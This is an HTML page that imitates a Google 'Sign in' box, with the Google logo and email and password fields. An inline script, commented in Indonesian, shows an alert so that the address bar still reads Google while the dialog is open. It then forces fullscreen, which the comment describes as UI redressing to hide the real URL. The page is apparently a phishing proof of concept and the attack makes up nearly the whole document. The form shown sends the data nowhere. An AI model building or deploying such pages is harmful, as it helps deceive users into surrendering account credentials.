<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
        .login-box { border: 1px solid #dadce0; padding: 20px; display: inline-block; border-radius: 8px; }
        input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
    </style>
</head>
<body>

    <script>
        // ALERT INI YANG PENTING: Bikin UI nge-freeze pas Address Bar masih Google
        alert("Sign in to continue"); 
        
        // Setelah user klik OK, otomatis minta Fullscreen buat redressing
        document.documentElement.requestFullscreen();
    </script>

    <div class="login-box">
        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
        <h2>Sign in</h2>
        <p>Use your Google Account</p>
        <input type="email" placeholder="Email or phone">
        <input type="password" placeholder="Enter your password">
        <button style="background:#1a73e8; color:white; border:none; padding:10px 20px; border-radius:4px; width:100%;">Next</button>
    </div>

</body>
</html>
